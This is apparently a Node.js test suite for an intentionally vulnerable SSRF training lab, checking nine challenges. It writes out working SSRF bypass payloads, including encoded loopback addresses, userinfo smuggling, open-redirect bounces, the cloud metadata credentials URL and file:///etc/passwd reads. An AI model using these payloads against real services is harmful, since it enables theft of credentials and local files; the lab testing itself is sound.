'use strict';
// SSRF module: every challenge must be solvable by the documented technique and
// must NOT be solvable by the obvious shortcut.
const test = require('node:test');
const assert = require('node:assert/strict');
const { client, bootLab, flagFromDb, capturedSet, FLAG_RE } = require('./helpers');

test('ssrf module', async (t) => {
  const { srv, dataDir } = await bootLab(t);
  const flagOf = (id) => flagFromDb(dataDir, 'ssrf', id);
  const port = new URL(srv.base).port;
  const secretUrl = `http://127.0.0.1:${port}/ssrf/internal/secret`;
  const statusUrl = `http://127.0.0.1:${port}/ssrf/internal/status`;
  const q = (u) => encodeURIComponent(u);

  await t.test('module page renders, links resolve, no em dash', async () => {
    const c = client(srv.base);
    const { status, text } = await c.get('/ssrf');
    assert.equal(status, 200);
    assert.ok(!text.includes('\u2014'), 'em dash in page');
    assert.equal((text.match(/class="vuln-card"/g) || []).length, 9);
    assert.equal((text.match(FLAG_RE) || []).length, 0);
    for (const href of [
      '/ssrf/fetch', '/ssrf/fetch2', '/ssrf/fetch3', '/ssrf/jump',
      '/ssrf/userinfo', '/ssrf/hex-ip', '/ssrf/octal-ip', '/ssrf/zero-ip',
      '/ssrf/fetch-meta', '/ssrf/fetch-file', '/ssrf/internal/status',
    ]) {
      const r = await c.get(href);
      assert.notEqual(r.status, 404, href);
    }
  });

  await t.test('basic: open fetcher reaches the internal secret, status endpoint earns nothing', async () => {
    const c = client(srv.base);
    const benign = await c.get('/ssrf/fetch?url=' + q(statusUrl));
    assert.equal(benign.status, 200);
    assert.ok(!benign.text.includes(flagOf('basic')), 'status endpoint must not award');
    const hit = await c.get('/ssrf/fetch?url=' + q(secretUrl));
    assert.ok(hit.text.includes(flagOf('basic')));
    assert.ok((await capturedSet(c)).includes('ssrf:Basic SSRF'));
  });

  await t.test('bypass: blocked strings are rejected, decimal loopback slips through', async () => {
    const c = client(srv.base);
    const blocked = await c.get('/ssrf/fetch2?url=' + q(secretUrl));
    assert.equal(blocked.status, 403);
    assert.ok(!blocked.text.includes(flagOf('bypass')), 'blocked request must not award');
    const hit = await c.get('/ssrf/fetch2?url=' + q(`http://2130706433:${port}/ssrf/internal/secret`));
    assert.ok(hit.text.includes(flagOf('bypass')));
    assert.ok((await capturedSet(c)).includes('ssrf:Blocklist bypass'));
  });

  await t.test('ssrf-redirect: blocked initial host is rejected, open redirect bounce wins', async () => {
    const c = client(srv.base);
    const blocked = await c.get('/ssrf/fetch3?url=' + q(secretUrl));
    assert.equal(blocked.status, 403);
    assert.ok(!blocked.text.includes(flagOf('ssrf-redirect')), 'direct blocked host must not award');
    const jump = `http://localhost:${port}/ssrf/jump?to=${q(secretUrl)}`;
    const hit = await c.get('/ssrf/fetch3?url=' + q(jump));
    assert.ok(hit.text.includes(flagOf('ssrf-redirect')));
    assert.ok((await capturedSet(c)).includes('ssrf:Open-redirect SSRF'));
  });

  await t.test('ssrf-userinfo: non-allowlisted URLs are rejected, userinfo smuggling wins', async () => {
    const c = client(srv.base);
    const blocked = await c.get('/ssrf/userinfo?url=' + q('http://example.com/'));
    assert.equal(blocked.status, 403);
    assert.ok(!blocked.text.includes(flagOf('ssrf-userinfo')), 'non-allowlisted URL must not award');
    const smuggle = `http://pentrix.lab@127.0.0.1:${port}/ssrf/internal/secret`;
    const hit = await c.get('/ssrf/userinfo?url=' + q(smuggle));
    assert.ok(hit.text.includes(flagOf('ssrf-userinfo')));
    assert.ok((await capturedSet(c)).includes('ssrf:Userinfo bypass'));
  });

  await t.test('ssrf-hex-ip: plain loopback is blocked, hex loopback slips through', async () => {
    const c = client(srv.base);
    const blocked = await c.get('/ssrf/hex-ip?url=' + q(secretUrl));
    assert.equal(blocked.status, 403);
    assert.ok(!blocked.text.includes(flagOf('ssrf-hex-ip')), 'blocked request must not award');
    const hit = await c.get('/ssrf/hex-ip?url=' + q(`http://0x7f.0.0.1:${port}/ssrf/internal/secret`));
    assert.ok(hit.text.includes(flagOf('ssrf-hex-ip')));
    assert.ok((await capturedSet(c)).includes('ssrf:Hex IP bypass'));
  });

  await t.test('ssrf-octal-ip: plain loopback is blocked, octal loopback slips through', async () => {
    const c = client(srv.base);
    const blocked = await c.get('/ssrf/octal-ip?url=' + q(secretUrl));
    assert.equal(blocked.status, 403);
    assert.ok(!blocked.text.includes(flagOf('ssrf-octal-ip')), 'blocked request must not award');
    const hit = await c.get('/ssrf/octal-ip?url=' + q(`http://0177.0.0.1:${port}/ssrf/internal/secret`));
    assert.ok(hit.text.includes(flagOf('ssrf-octal-ip')));
    assert.ok((await capturedSet(c)).includes('ssrf:Octal IP bypass'));
  });

  await t.test('ssrf-zero-ip: plain loopback is blocked, 0.0.0.0 is treated as this host', async () => {
    const c = client(srv.base);
    const blocked = await c.get('/ssrf/zero-ip?url=' + q(secretUrl));
    assert.equal(blocked.status, 403);
    assert.ok(!blocked.text.includes(flagOf('ssrf-zero-ip')), 'blocked request must not award');
    const hit = await c.get('/ssrf/zero-ip?url=' + q(`http://0.0.0.0:${port}/ssrf/internal/secret`));
    assert.ok(hit.text.includes(flagOf('ssrf-zero-ip')));
    assert.ok((await capturedSet(c)).includes('ssrf:0.0.0.0 bypass'));
  });

  await t.test('ssrf-metadata: link-local metadata address leaks simulated credentials', async () => {
    const c = client(srv.base);
    const benign = await c.get('/ssrf/fetch-meta?url=' + q(statusUrl));
    assert.ok(!benign.text.includes(flagOf('ssrf-metadata')), 'status endpoint must not award');
    const hit = await c.get('/ssrf/fetch-meta?url=' + q('http://169.254.169.254/latest/meta-data/iam/security-credentials/'));
    assert.ok(hit.text.includes(flagOf('ssrf-metadata')));
    assert.ok((await capturedSet(c)).includes('ssrf:Cloud metadata SSRF'));
  });

  await t.test('ssrf-file: file scheme reads local files, the root line earns the flag', async () => {
    const c = client(srv.base);
    const benign = await c.get('/ssrf/fetch-file?url=' + q('file:///etc/hostname'));
    assert.ok(benign.text.includes('root:') === false, 'sanity: hostname has no root line');
    assert.ok(!benign.text.includes(flagOf('ssrf-file')), 'file without root line must not award');
    const hit = await c.get('/ssrf/fetch-file?url=' + q('file:///etc/passwd'));
    assert.ok(hit.text.includes('root:'));
    assert.ok(hit.text.includes(flagOf('ssrf-file')));
    assert.ok((await capturedSet(c)).includes('ssrf:file:// scheme SSRF'));
  });

  await t.test('scoreboard counts each captured challenge once', async () => {
    const c = client(srv.base);
    const jump = `http://localhost:${port}/ssrf/jump?to=${q(secretUrl)}`;
    const exploits = [
      ['basic', '/ssrf/fetch?url=' + q(secretUrl)],
      ['bypass', '/ssrf/fetch2?url=' + q(`http://2130706433:${port}/ssrf/internal/secret`)],
      ['ssrf-redirect', '/ssrf/fetch3?url=' + q(jump)],
      ['ssrf-userinfo', '/ssrf/userinfo?url=' + q(`http://pentrix.lab@127.0.0.1:${port}/ssrf/internal/secret`)],
      ['ssrf-hex-ip', '/ssrf/hex-ip?url=' + q(`http://0x7f.0.0.1:${port}/ssrf/internal/secret`)],
      ['ssrf-octal-ip', '/ssrf/octal-ip?url=' + q(`http://0177.0.0.1:${port}/ssrf/internal/secret`)],
      ['ssrf-zero-ip', '/ssrf/zero-ip?url=' + q(`http://0.0.0.0:${port}/ssrf/internal/secret`)],
      ['ssrf-metadata', '/ssrf/fetch-meta?url=' + q('http://169.254.169.254/latest/meta-data/iam/security-credentials/')],
      ['ssrf-file', '/ssrf/fetch-file?url=' + q('file:///etc/passwd')],
    ];
    for (const [id, url] of exploits) {
      const r = await c.get(url);
      assert.ok(r.text.includes(flagOf(id)), `exploit for ${id} did not award`);
    }
    // Capture one challenge twice: still exactly one entry.
    await c.get('/ssrf/fetch?url=' + q(secretUrl));
    const got = (await capturedSet(c)).filter((s) => s.startsWith('ssrf:'));
    const names = [
      'ssrf:Basic SSRF', 'ssrf:Blocklist bypass', 'ssrf:Open-redirect SSRF',
      'ssrf:Userinfo bypass', 'ssrf:Hex IP bypass', 'ssrf:Octal IP bypass',
      'ssrf:0.0.0.0 bypass', 'ssrf:Cloud metadata SSRF', 'ssrf:file:// scheme SSRF',
    ];
    assert.equal(got.length, 9);
    for (const n of names) assert.equal(got.filter((s) => s === n).length, 1, n);
  });
});
